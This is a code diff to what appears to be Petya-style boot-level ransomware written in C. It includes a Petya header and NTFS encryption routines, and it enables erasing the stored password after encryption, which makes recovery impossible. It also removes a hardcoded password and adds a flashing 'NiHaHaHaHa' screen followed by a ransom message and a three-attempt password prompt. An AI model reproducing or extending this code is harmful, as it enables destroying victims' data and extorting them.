@@ -11,8 +11,8 @@
 #include "ntfs_crypt.h"
 #include "hidden_store.h"
 #include "password_store.h"
+#include "petya.h"
 
-#define PASSWORD "123456"
 #define MAX_ATTEMPTS 3
 #define MAX_PW_LEN 32
 
@@ -411,7 +411,7 @@ void do_encryption(void)
     }
 
     zero_buffer(password, sizeof(password));
-    //pwstore_erase();
+    pwstore_erase();
 
     vga_puts("[4/4] Saving state...\n");
     if (state_write(STATE_ENCRYPTED) != 0)
@@ -472,9 +472,32 @@ void login(void)
         goto halt;
     }
 
+    // NiHaHaHaHa
+    int flag = 0;
+    while (1)
+    {
+        vga_clear();
+        vga_set_color(flag == 0 ? COLOR_WHITE_ON_BLACK : COLOR_WHITE_ON_RED);
+
+        flag = flag ? 0 : 1;
+
+        vga_draw_centered_ascii("NiHaHaHaHa\n(Press any key to NiHaHaHaHa)");
+
+        if (keyboard_hashkey())
+            break;
+
+        sleep(100);
+    }
+
+    keyboard_getchar();
+    vga_clear();
+    vga_set_color(COLOR_RED_ON_BLACK);
+    vga_puts(RANSOM_MSG);
+    vga_putchar('\n');
+
+    // Enter your password
     while (attempts < MAX_ATTEMPTS)
     {
-        vga_set_color(COLOR_YELLOW_ON_BLACK);
         vga_puts("Attempts remaining: ");
         vga_put_dec(MAX_ATTEMPTS - attempts);
         vga_putchar('\n');
@@ -541,9 +564,7 @@ void login(void)
         }
 
         zero_buffer(input, MAX_PW_LEN);
-        vga_set_color(COLOR_RED_ON_BLACK);
         vga_puts("Wrong pasword.\n\n");
-        vga_set_color(COLOR_WHITE_ON_BLACK);
 
         attempts++;
     }
